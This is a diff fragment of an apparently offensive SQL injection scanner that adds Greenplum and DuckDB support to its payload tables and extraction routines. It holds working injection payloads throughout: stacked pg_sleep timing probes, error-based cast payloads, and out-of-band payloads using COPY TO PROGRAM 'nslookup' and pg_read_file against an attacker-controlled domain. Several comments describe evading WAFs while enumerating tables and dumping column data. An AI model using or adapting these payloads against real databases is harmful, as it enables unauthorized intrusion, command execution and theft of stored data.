+                if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                     payload = f"'; SELECT pg_sleep({t}) FROM {sep}{table}{sep} WHERE {col_q} >= {val_literal} LIMIT 1 OFFSET {offset}-- -"
                 elif self.dbms in ("MySQL", "MariaDB", "TiDB"):
                     # BUG-FROMEXTRACT-STACKED-TIDB FIX: TiDB is MySQL-wire-compatible; SLEEP()
@@ -51938,15 +52046,20 @@ OOB_PAYLOADS_MAP={
         "; SELECT dblink_connect('host={token}.{domain} dbname=x connect_timeout=2')-- -",
     ],
     "Amazon Redshift": [
-        # Redshift does not support COPY TO PROGRAM or xp_dirtree; pg_read_file path
-        # manipulation via S3-backed virtual path is the most viable OOB vector.
-        # COPY FROM S3 can trigger DNS to an attacker-controlled S3-like endpoint.
         "'; COPY (SELECT 1) TO PROGRAM 'nslookup {token}.{domain}'-- -",
         "'; SELECT pg_read_file('//{token}.{domain}/x')-- -",
         "1'; SELECT pg_read_file('//{token}.{domain}/x')-- -",
-        # Numeric context variants
         "; SELECT pg_read_file('//{token}.{domain}/x')-- -",
         "; COPY (SELECT 1) TO PROGRAM 'nslookup {token}.{domain}'-- -",
+    ],
+    "Greenplum": [
+        "'; COPY (SELECT 1) TO PROGRAM 'nslookup {token}.{domain}'-- -",
+        "'; SELECT pg_read_file('//{token}.{domain}/x')-- -",
+        "; COPY (SELECT 1) TO PROGRAM 'nslookup {token}.{domain}'-- -",
+    ],
+    "DuckDB": [
+        "'; SELECT read_text('//{token}.{domain}/x')-- -",
+        "; SELECT read_text('//{token}.{domain}/x')-- -",
     ],
 
     "Generic":[
@@ -55739,13 +55852,16 @@ class Scanner:
             # Redshift — both are PostgreSQL-wire-compatible and support identical
             # pg_tables + current_schema() catalog queries. Without this, both fell
             # to `else: return []`, completely breaking E/EH table enumeration.
-            elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                           "Greenplum"):
                 # BUG-COCKROACHDB-ERROR-TABLES FIX: CockroachDB was not present in any
                 # if/elif branch, so it always fell through to `else: return []`, making
                 # all table enumeration on CockroachDB error-based extraction silently
                 # return an empty list.  CockroachDB is PostgreSQL-wire-compatible and
                 # supports pg_tables with identical schemaname / tablename columns.
                 # Group it with PostgreSQL so both use the correct catalog queries.
+                # BUG-ERREXT-TABLES-GREENPLUM FIX: Greenplum was missing; fell to return [].
+                # Greenplum is PostgreSQL-wire-compatible; pg_tables + current_schema() work.
                 #
                 # BUG-PG-ERROR-TABLES-PUBLIC-SCHEMA FIX: Both branches previously used
                 # schemaname='public', which returns no results for PostgreSQL/CockroachDB
@@ -55864,6 +55980,13 @@ class Scanner:
                                    "WHERE database=currentDatabase() "
                                    "AND engine NOT IN ('View','MaterializedView','Dictionary') "
                                    "ORDER BY name LIMIT 1 OFFSET {offset}")
+            elif _dbms == "DuckDB":
+                # BUG-ERREXT-TABLES-DUCKDB FIX: DuckDB was missing; fell to return [].
+                # DuckDB supports information_schema.tables (schema-scoped).
+                count_query = "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=current_schema()"
+                table_query_tpl = ("SELECT table_name FROM information_schema.tables "
+                                   "WHERE table_schema=current_schema() "
+                                   "ORDER BY table_name LIMIT 1 OFFSET {offset}")
             else:
                 LOG.warning("[ErrorExtract] Unsupported DBMS for table enumeration: %s", _dbms)
                 return []
@@ -55925,7 +56048,7 @@ class Scanner:
             # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon
             # Redshift — both support identical information_schema.columns + current_schema()
             # as PostgreSQL/CockroachDB. Without this, both fell to `else: return []`.
-            elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                 # BUG-COCKROACHDB-ERROR-COLS FIX: CockroachDB had no branch in this
                 # if/elif chain, so it always fell through to `else: return []`, making
                 # all column enumeration on CockroachDB error-based extraction silently
@@ -56152,7 +56275,7 @@ class Scanner:
                 count_query = f"SELECT COUNT(*) FROM `{table}`"
             # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon Redshift
             # to the double-quote branch — both are PG-wire-compatible.
-            elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                 count_query = f'SELECT COUNT(*) FROM "{table}"'
             elif _dbms == "MSSQL":
                 count_query = f"SELECT COUNT(*) FROM [{table}]"
@@ -56219,7 +56342,7 @@ class Scanner:
                         cell_query = f"SELECT `{col}` FROM `{table}` LIMIT {row_idx},1"
                     # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon
                     # Redshift — both are PG-wire-compatible and require identical CAST AS TEXT.
-                    elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                    elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                         # BUG-COCKROACHDB-ERROR-DUMP-CAST FIX: CockroachDB was not in the
                         # PostgreSQL branch and fell to the generic `else`, which doesn't
                         # wrap numeric columns in CAST AS TEXT.  When the column type is
@@ -56381,6 +56504,8 @@ class Scanner:
             "CockroachDB": "current_database()",   # PostgreSQL-compatible
             "YugabyteDB": "current_database()",    # BUG-ERREXT-DB-YUGABYTE FIX: PG-compatible
             "Amazon Redshift": "current_database()",  # BUG-ERREXT-DB-REDSHIFT FIX: PG-compatible
+            "Greenplum": "current_database()",  # BUG-ERREXT-DB-REDSHIFT FIX: PG-compatible
+            "DuckDB": "current_database()",  # BUG-ERREXT-DB-REDSHIFT FIX: PG-compatible
             "MSSQL": "db_name()",
             "Sybase": "db_name()",                 # T-SQL compatible
             # BUG-ORA-ERREXT-DBNAME FIX: The previous value was:
@@ -56429,6 +56554,8 @@ class Scanner:
             "CockroachDB": "current_user",         # PostgreSQL-compatible keyword
             "YugabyteDB": "current_user",          # BUG-ERREXT-USER-YUGABYTE FIX: PG keyword
             "Amazon Redshift": "current_user",     # BUG-ERREXT-USER-REDSHIFT FIX: PG keyword
+            "Greenplum": "current_user",     # BUG-ERREXT-USER-REDSHIFT FIX: PG keyword
+            "DuckDB": "current_user",     # BUG-ERREXT-USER-REDSHIFT FIX: PG keyword
             "MSSQL": "system_user",                # T-SQL special register
             "Sybase": "suser_sname()",             # Sybase equivalent of system_user
             "Oracle": "user",                      # Oracle special value
@@ -56471,6 +56598,8 @@ class Scanner:
             "CockroachDB": "version()",            # PostgreSQL-compatible, works as-is
             "YugabyteDB": "yb_server_version()",   # YugabyteDB-specific version function
             "Amazon Redshift": "version()",        # PG-compatible version()
+            "Greenplum": "version()",        # PG-compatible version()
+            "DuckDB": "version()",        # PG-compatible version()
             "MSSQL": "@@version",
             "Sybase": "@@version",                 # Sybase T-SQL compatible
             "Oracle": "(SELECT banner FROM v$version WHERE ROWNUM=1)",
@@ -56758,6 +56887,8 @@ class Scanner:
             "CockroachDB":     "1e0=1e0",
             "YugabyteDB":      "1e0=1e0",
             "Amazon Redshift": "1e0=1e0",
+            "Greenplum": "1e0=1e0",
+            "DuckDB": "1e0=1e0",
             "MySQL":           "1e0=1e0",
             "MariaDB":         "1e0=1e0",
             "TiDB":            "1e0=1e0",
@@ -56777,6 +56908,8 @@ class Scanner:
             "CockroachDB":     "0e0=1e0",
             "YugabyteDB":      "0e0=1e0",
             "Amazon Redshift": "0e0=1e0",
+            "Greenplum": "0e0=1e0",
+            "DuckDB": "0e0=1e0",
             "MySQL":           "0e0=1e0",
             "MariaDB":         "0e0=1e0",
             "TiDB":            "0e0=1e0",
@@ -56968,7 +57101,11 @@ class Scanner:
                 # detection payload content at all.
                 # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon
                 # Redshift — both support pg_sleep() as PostgreSQL-wire-compatible engines.
-                if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                # BUG-INFERENCE-STACKED-GREENPLUM-DUCKDB FIX (HIGH): Greenplum and DuckDB
+                # were absent → fell to else: SLEEP() — MySQL syntax not available in either
+                # → SQL error → fast response → timing oracle always False → empty extraction.
+                if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                             "Greenplum", "DuckDB"):
                     _timing_body = f"; SELECT pg_sleep({_time_sec}*([INFERENCE])::int)"
                 elif _dbms in ("MySQL", "MariaDB", "TiDB", "H2"):
                     # BUG-INFERENCE-STANDALONE-TIDB FIX: TiDB is MySQL-wire-compatible; SLEEP() valid.
@@ -57006,7 +57143,10 @@ class Scanner:
                 LOG.info("[Inference] S technique: detection payload has no SELECT — "
                          "built standalone stacked timing probe (not grafted onto DML)")
             # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon Redshift.
-            elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            # BUG-INFERENCE-GRAFT-GREENPLUM-DUCKDB FIX (HIGH): Greenplum and DuckDB absent
+            # → fell to else: SLEEP() which doesn't exist → SQL error → oracle always False.
+            elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                           "Greenplum", "DuckDB"):
                 _timing_body = _body.rsplit("SELECT", 1)[0] + f"SELECT pg_sleep({_time_sec}*([INFERENCE])::int)"
             elif _dbms in ("MySQL", "MariaDB", "TiDB"):
                 # BUG-INFERENCE-GRAFT-TIDB FIX: TiDB is MySQL-wire-compatible; SLEEP() valid.
@@ -57063,7 +57203,9 @@ class Scanner:
                         # BUG-INFERENCE-SLEEPARG-TIDB FIX: TiDB supports IF() like MySQL.
                         _cond_arg = f"IF([INFERENCE],{_arg2},0)"
                     # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB/Amazon Redshift.
-                    elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                    # BUG-INFERENCE-SLEEPARG-GREENPLUM-DUCKDB FIX: add Greenplum/DuckDB.
+                    elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                                   "Greenplum", "DuckDB"):
                         # Multiply by boolean::int  avoids CASE WHEN which WAFs block
                         _cond_arg = f"{_arg2}*([INFERENCE])::int"
                     elif _dbms in ("H2",):
@@ -57103,7 +57245,9 @@ class Scanner:
                         _gs_num = _gs_m.group(1)
                         _gs_s, _gs_e = _gs_m.start(1), _gs_m.end(1)
                         # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB/Redshift.
-                        if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                        # BUG-INFERENCE-GENSERIES-GREENPLUM-DUCKDB FIX: add Greenplum/DuckDB.
+                        if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                                     "Greenplum", "DuckDB"):
                             _cond_gs = f"([INFERENCE])::int*{_gs_num}+1"
                         else:
                             _cond_gs = f"CASE WHEN [INFERENCE] THEN {_gs_num} ELSE 1 END"
@@ -57202,7 +57346,9 @@ class Scanner:
                 if _stk_sl_m:
                     _stk_arg = _stk_sl_m.group(2).strip()
                     _stk_s, _stk_e = _stk_sl_m.start(2), _stk_sl_m.end(2)
-                    if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                    # BUG-INFERENCE-STACKED-NOWHERE-GREENPLUM-DUCKDB FIX: add Greenplum/DuckDB.
+                    if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                                 "Greenplum", "DuckDB"):
                         _stk_cond = f"{_stk_arg}*([INFERENCE])::int"
                     else:
                         _stk_cond = f"CASE WHEN [INFERENCE] THEN {_stk_arg} ELSE 0 END"
@@ -57420,7 +57566,7 @@ class Scanner:
                                         _template = (_body +
                                                      f" AND IF([INFERENCE],SLEEP({_ts_inf}),0)")
                                     elif _dbms in ("PostgreSQL", "CockroachDB",
-                                                   "YugabyteDB", "Amazon Redshift"):
+                                                   "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                                         _template = (_body +
                                                      f" AND (CASE WHEN [INFERENCE] THEN"
                                                      f" pg_sleep({_ts_inf}) ELSE NULL END)"
@@ -57536,6 +57682,13 @@ class Scanner:
                 # Fix: add explicit entries with 1114111 upper bound, matching PostgreSQL/CockroachDB.
                 "YugabyteDB":      "ASCII(SUBSTRING(([QUERY]),{pos},1)) BETWEEN {mid} AND 1114111",
                 "Amazon Redshift": "ASCII(SUBSTRING(([QUERY]),{pos},1)) BETWEEN {mid} AND 1114111",
+                # BUG-BETWEEN-GREENPLUM-DUCKDB-CHARFN FIX: Greenplum and DuckDB were missing from
+                # _CHAR_FN BETWEEN dict. Both are PG-wire-compatible; ASCII(SUBSTRING(...)) returns
+                # full Unicode code points (0..U+10FFFF = 1,114,111). Without explicit entries they
+                # fell to _char_default which uses "AND 255" upper bound — any char with code point
+                # > 255 made every BETWEEN probe False → binary search converged to lo=0 → fallback.
+                "Greenplum":       "ASCII(SUBSTRING(([QUERY]),{pos},1)) BETWEEN {mid} AND 1114111",
+                "DuckDB":          "ASCII(SUBSTRING(([QUERY]),{pos},1)) BETWEEN {mid} AND 1114111",
                 "MySQL":       "ORD(MID(([QUERY]),{pos},1)) BETWEEN {mid} AND 1114111",
                 "MariaDB":     "ORD(MID(([QUERY]),{pos},1)) BETWEEN {mid} AND 1114111",
                 # BUG-INFERENCE-CHAR-TIDB-MAIN-BISECT FIX: TiDB was missing from _CHAR_FN in
@@ -57598,6 +57751,12 @@ class Scanner:
                 "CockroachDB":     "CHAR_LENGTH(([QUERY])) BETWEEN {mid} AND 99999",
                 "YugabyteDB":      "CHAR_LENGTH(([QUERY])) BETWEEN {mid} AND 99999",
                 "Amazon Redshift": "CHAR_LENGTH(([QUERY])) BETWEEN {mid} AND 99999",
+                # BUG-BETWEEN-GREENPLUM-DUCKDB-LENFN FIX: Greenplum and DuckDB were missing from
+                # _LEN_FN BETWEEN dict. Both are PG-wire-compatible; CHAR_LENGTH() returns Unicode
+                # character count. Without explicit entries they fell to auto-converted _LENGTH_FN_BT
+                # default. Explicit entries document intent and guard against future _LENGTH_FN changes.
+                "Greenplum":       "CHAR_LENGTH(([QUERY])) BETWEEN {mid} AND 99999",
+                "DuckDB":          "CHAR_LENGTH(([QUERY])) BETWEEN {mid} AND 99999",
                 "Oracle":      "LENGTHC(([QUERY])) BETWEEN {mid} AND 99999",
                 "SQLite":      "LENGTH(([QUERY])) BETWEEN {mid} AND 99999",
                 "DB2":         "LENGTH(([QUERY])) BETWEEN {mid} AND 99999",
@@ -57627,6 +57786,13 @@ class Scanner:
                 # are safer and guard against future _char_default changes.
                 "YugabyteDB":      "ASCII(SUBSTRING(([QUERY]),{pos},1))>={mid}",
                 "Amazon Redshift": "ASCII(SUBSTRING(([QUERY]),{pos},1))>={mid}",
+                # BUG-GT-GREENPLUM-DUCKDB-CHARFN FIX: Greenplum and DuckDB were missing from
+                # _CHAR_FN > mode dict. Both are PG-wire-compatible; ASCII(SUBSTRING(...)) returns
+                # full Unicode code points. Without explicit entries they fell to _char_default
+                # which is "ASCII(SUBSTRING(...))>{mid}" — functionally correct since _bisect_char_hi
+                # returns 1114111 for PG-family, but explicit entries are safer and document intent.
+                "Greenplum":       "ASCII(SUBSTRING(([QUERY]),{pos},1))>={mid}",
+                "DuckDB":          "ASCII(SUBSTRING(([QUERY]),{pos},1))>={mid}",
                 "MySQL":       "ORD(MID(([QUERY]),{pos},1))>={mid}",
                 "MariaDB":     "ORD(MID(([QUERY]),{pos},1))>={mid}",
                 # BUG-INFERENCE-CHAR-TIDB-MAIN-BISECT FIX (> mode): TiDB was missing from
@@ -57677,6 +57843,13 @@ class Scanner:
             # is more explicit about returning character count rather than byte count.
             "YugabyteDB":      "CHAR_LENGTH(([QUERY]))>={mid}",
             "Amazon Redshift": "CHAR_LENGTH(([QUERY]))>={mid}",
+            # BUG-GT-GREENPLUM-DUCKDB-LENGTHFN FIX: Greenplum and DuckDB were missing from
+            # _LENGTH_FN. Both are PG-wire-compatible; CHAR_LENGTH() returns Unicode character
+            # count. Without explicit entries they fell to _len_default "LENGTH(...)>={mid}"
+            # which is correct for PG-compat (LENGTH()=character count), but CHAR_LENGTH()
+            # is more explicit and guards against future _len_default changes.
+            "Greenplum":       "CHAR_LENGTH(([QUERY]))>={mid}",
+            "DuckDB":          "CHAR_LENGTH(([QUERY]))>={mid}",
             # BUG-FIX-MYSQL-CHAR-LENGTH (Req 7/10): MySQL LENGTH() returns byte count.
             # For utf8mb4 databases, multi-byte characters (emoji, CJK) inflate the byte
             # count, causing the extraction loop to probe past the real string end and read
@@ -57740,7 +57913,9 @@ class Scanner:
             """Quote a string value for the target DBMS."""
             # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB/Amazon Redshift
             # to dollar-quoting branch — both are PG-wire-compatible and support $$ quoting.
-            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            # BUG-INFERENCE-DQUOTE-GREENPLUM-DUCKDB FIX: Greenplum/DuckDB also support $$-quoting.
+            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                         "Greenplum", "DuckDB"):
                 return f"$${val}$$"
             else:
                 # Standard SQL: single quotes with doubled escaping
@@ -58797,7 +58972,9 @@ class Scanner:
                 _fn_start = _sleep_m.start(2)
                 _fn_end = _sleep_m.end(2)
                 
-                if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                # BUG-INFERENCE-ARITH-GREENPLUM-DUCKDB FIX: add Greenplum/DuckDB to pg_sleep gate.
+                if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                             "Greenplum", "DuckDB"):
                     _new_arg = f"([INFERENCE])::int*{_arg}"
                 elif _dbms in ("MySQL", "MariaDB", "TiDB"):
                     # BUG-INFERENCE-ARITH-TIDB FIX: TiDB is MySQL-wire-compatible; IF() valid.
@@ -58826,7 +59003,9 @@ class Scanner:
                 _gs_num = _genseries_m.group(1)
                 _gs_start = _genseries_m.start(1)
                 _gs_end = _genseries_m.end(1)
-                if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                # BUG-INFERENCE-GENSERIES2-GREENPLUM-DUCKDB FIX: add Greenplum/DuckDB.
+                if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                             "Greenplum", "DuckDB"):
                     _new_num = f"([INFERENCE])::int*{_gs_num}"
                 else:
                     _new_num = f"CASE WHEN [INFERENCE] THEN {_gs_num} ELSE 1 END"
@@ -59256,7 +59435,9 @@ class Scanner:
                             # Fix: use round-specific conditions that are semantically
                             # equivalent to 1=1/1=2 but are different strings → unique
                             # dedup cache keys → real network requests sent.
-                            _floor_pg = _dbms in ('PostgreSQL', 'CockroachDB', 'YugabyteDB', 'Amazon Redshift')
+                            # BUG-INFERENCE-FLOOR-GREENPLUM-DUCKDB FIX: add Greenplum/DuckDB.
+                            _floor_pg = _dbms in ('PostgreSQL', 'CockroachDB', 'YugabyteDB',
+                                                   'Amazon Redshift', 'Greenplum', 'DuckDB')
                             _floor_my = _dbms in ('MySQL', 'MariaDB', 'TiDB')
                             _floor_ms = _dbms in ('MSSQL', 'Sybase', 'DB2', 'Firebird', 'H2', 'Informix', 'SAP_HANA')
                             _floor_or = _dbms == 'Oracle'
@@ -59662,6 +59843,14 @@ class Scanner:
                 # BUG-ERRPAYLOAD-REDSHIFT FIX: Amazon Redshift is PG-compatible; same error patterns.
                 "Amazon Redshift": [
                     ("cast", "CAST(([QUERY]) AS INT)"),
+                    ("convert", "(([QUERY])::int)"),
+                ],
+                "Greenplum": [
+                    ("cast", "CAST(([QUERY]) AS INT)"),
+                    ("convert", "(([QUERY])::int)"),
+                ],
+                "DuckDB": [
+                    ("cast", "CAST(([QUERY]) AS INT)"),
                 ],
                 "MySQL": [
                     ("extractvalue", "extractvalue(1,concat(0x7e,([QUERY]),0x7e))"),
@@ -59720,6 +59909,8 @@ class Scanner:
                         "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         "MySQL": "ISNULL(NULL)", "MariaDB": "ISNULL(NULL)", "TiDB": "ISNULL(NULL)",
                         "MSSQL": "(1e0 IS NOT NULL)", "Sybase": "(1e0 IS NOT NULL)",
                         "Oracle": "(NVL(NULL,1e0) IS NOT NULL)", "SQLite": "(1e0 IS NOT 0e0)",
@@ -59805,6 +59996,8 @@ class Scanner:
                 # BUG-ERRPRIMARY-YUGABYTE-REDSHIFT FIX: PG-compatible; same error pattern.
                 "YugabyteDB":      r'invalid input syntax[^"]*"([^"]+)"',
                 "Amazon Redshift": r'invalid input syntax[^"]*"([^"]+)"',
+                "Greenplum": r'invalid input syntax[^"]*"([^"]+)"',
+                "DuckDB": r'invalid input syntax[^"]*"([^"]+)"',
                 "MSSQL":      r"Conversion failed[^'\"]*['\"]([^'\"]+)",
                 "Sybase":     r"Conversion failed[^'\"]*['\"]([^'\"]+)",
                 "Oracle":     r"ORA-\d+[^'\"]*['\"]([^'\"]{2,})",
@@ -59867,6 +60060,8 @@ class Scanner:
                 "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                 "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                 "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                 "MySQL":           "ISNULL(NULL)",
                 "MariaDB":         "ISNULL(NULL)",
                 "TiDB":            "ISNULL(NULL)",
@@ -59928,8 +60123,10 @@ class Scanner:
             else:
                 # PostgreSQL, CockroachDB, YugabyteDB, SQLite, DB2, etc. use ||
                 # BUG-EXTRACTMULTI-CRDB FIX: include CockroachDB/YugabyteDB/Redshift in ::TEXT cast.
+                # BUG-EXTRACTMULTI-GREENPLUM-DUCKDB FIX: add Greenplum/DuckDB to ::TEXT cast branch.
                 _parts = [f"COALESCE(({q})::TEXT,{_quote('')})"
-                          if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift")
+                          if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                                       "Greenplum", "DuckDB")
                           else f"COALESCE(({q}),{_quote('')})" for q in _queries]
                 _concat = "||".join([_parts[0]] + [f"{_quote(_delim)}||{p}" for p in _parts[1:]])
 
@@ -59967,7 +60164,9 @@ class Scanner:
         async def _extract_hex(query, label="", max_len=128):
             """Extract via hex encoding. 4 steps/char, zero charset guessing."""
             # Build hex conversion query per DBMS
-            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            # BUG-INFERENCE-HEX-GREENPLUM-DUCKDB FIX: add Greenplum/DuckDB to encode()::bytea path.
+            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                         "Greenplum", "DuckDB"):
                 _hq = f"SELECT encode(({query})::bytea, {_quote('hex')})"
             elif _dbms in ("MySQL", "MariaDB", "TiDB"):
                 # BUG-INFERENCE-HEX-TIDB FIX: TiDB is MySQL-wire-compatible; HEX() valid.
@@ -60100,6 +60299,8 @@ class Scanner:
                 # BUG-ERRPAYLOAD-YUGABYTE-REDSHIFT FIX: PG-compatible; :: cast syntax works.
                 "YugabyteDB": ("1/((1>0)::int-1)", "1/((1>2)::int-1)"),
                 "Amazon Redshift": ("1/((1>0)::int-1)", "1/((1>2)::int-1)"),
+                "Greenplum": ("1/((1>0)::int-1)", "1/((1>2)::int-1)"),
+                "DuckDB": ("1/((1>0)::int-1)", "1/((1>2)::int-1)"),
                 "MySQL": ("IF(1>0,1/0,1)", "IF(1>2,1/0,1)"),
                 "MariaDB": ("IF(1>0,1/0,1)", "IF(1>2,1/0,1)"),
                 # BUG-ERRPAYLOAD-TIDB-DIV FIX: TiDB is MySQL-compatible; IF() and 1/0 work.
@@ -60257,7 +60458,7 @@ class Scanner:
             _ALT_CHAR = {}
             _alt_bet_hi = (1114111 if _dbms in ("SQLite", "MySQL", "MariaDB", "TiDB",
                                                 "PostgreSQL", "CockroachDB", "YugabyteDB",
-                                                "Amazon Redshift")
+                                                "Amazon Redshift", "Greenplum", "DuckDB")
                            else 65535 if _dbms in ("MSSQL", "Sybase", "Oracle")
                            else 1114111)
             if ">={mid}" in _base:
@@ -60382,7 +60583,9 @@ class Scanner:
             """Extract one character by testing individual bits. More noise-resistant.
             Uses ONLY & and = operators  WAFs never block these."""
             # Build DBMS-specific ASCII extraction
-            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            # BUG-BITWISE-GREENPLUM-DUCKDB-ASCII FIX: add Greenplum/DuckDB to PG-family branch.
+            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                         "Greenplum", "DuckDB"):
                 # BUG-INF-CHAR-BITWISE-TIDB-YG-REDSHIFT FIX: Added YugabyteDB and Amazon
                 # Redshift explicitly — both are PostgreSQL-wire-compatible and their
                 # ASCII(SUBSTRING(...)) returns 0..U+10FFFF, same as PostgreSQL/CockroachDB.
@@ -60478,11 +60681,12 @@ class Scanner:
             # Oracle to the 16-bit group. Also correct _bitwise_char_hi to match.
             # Numeric safety: each mask (1 << bit) is a plain integer in the BITAND/& SQL
             # condition; no string delimiters or comparison operands are modified.
+            # BUG-BITWISE-GREENPLUM-DUCKDB-NBITS FIX: add Greenplum/DuckDB to 21-bit group.
             _n_bits = (16 if _dbms in ("MSSQL", "Sybase", "Oracle")
                        else 21 if _dbms in ("SQLite", "MySQL", "MariaDB",
                                              "TiDB", "PostgreSQL",
                                              "CockroachDB", "YugabyteDB",
-                                             "Amazon Redshift")
+                                             "Amazon Redshift", "Greenplum", "DuckDB")
                        else 8)  # BUG-INF-CHAR-BITWISE-BITS FIX: Oracle→16, MySQL/PG→21; BUG-INF-CHAR-BITWISE-TIDB-YG-REDSHIFT FIX: added TiDB/YG/Redshift→21
             _bit_conds = []
             for bit in range(_n_bits - 1, -1, -1):
@@ -60657,7 +60861,7 @@ class Scanner:
                                 else 1114111 if _dbms in ("SQLite", "MySQL", "MariaDB",
                                                            "TiDB", "PostgreSQL",
                                                            "CockroachDB", "YugabyteDB",
-                                                           "Amazon Redshift")
+                                                           "Amazon Redshift", "Greenplum", "DuckDB")
                                 else 255)  # BUG-INF-CHAR-BITWISE-BITS FIX: was else 255 for all; BUG-INF-CHAR-BITWISE-TIDB-YG-REDSHIFT FIX: added TiDB/YG/Redshift→1114111
             return chr(_val) if 32 <= _val <= _bitwise_char_hi else None
 
@@ -61173,7 +61377,9 @@ class Scanner:
 
         async def _extract_char_equality(query, pos):
             """Extract one char using only = operator. ~10 probes avg with frequency order."""
-            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            # BUG-EQUALITY-GREENPLUM-DUCKDB FIX: add Greenplum/DuckDB to SUBSTR alias branch.
+            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                         "Greenplum", "DuckDB"):
                 # BUG-EQ-TIDB-YG-REDSHIFT FIX: Added YugabyteDB and Amazon Redshift.
                 # Both are PostgreSQL-wire-compatible and support SUBSTR() alias which
                 # bypasses WAF rules that specifically target the SUBSTRING( pattern.
@@ -61464,7 +61670,9 @@ class Scanner:
             # compatible and supports MySQL's REGEXP operator with identical syntax (incl.
             # the '^.{N}[lo-hi]' character-class range patterns used by _regex_range_check).
             # Fix: add "TiDB" alongside "MySQL", "MariaDB" so TiDB receives regex extraction.
+            # BUG-REGEX-GREENPLUM-DUCKDB FIX: add Greenplum/DuckDB — both support PG ~ operator.
             if _dbms not in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                              "Greenplum", "DuckDB",
                               "MySQL", "MariaDB", "TiDB"):
                 return ""  # regex binary search only for supported DBMSes
 
@@ -61489,7 +61697,9 @@ class Scanner:
                 _prefix_pat = "." * (pos - 1)  # '.' matches any single char in POSIX
                 # BUG-REGEX-YUGABYTEDB-REDSHIFT FIX: YugabyteDB and Amazon Redshift
                 # support PostgreSQL's ~ POSIX regex operator — add both to the PG branch.
-                if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                # BUG-REGEX-GREENPLUM-DUCKDB FIX: Greenplum/DuckDB also support PG ~ operator.
+                if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                             "Greenplum", "DuckDB"):
                     # POSIX regex: ~ '^.{N}[lo-hi]'
                     _pat = f"^{_prefix_pat}[{_lo_chr}-{_hi_chr}]"
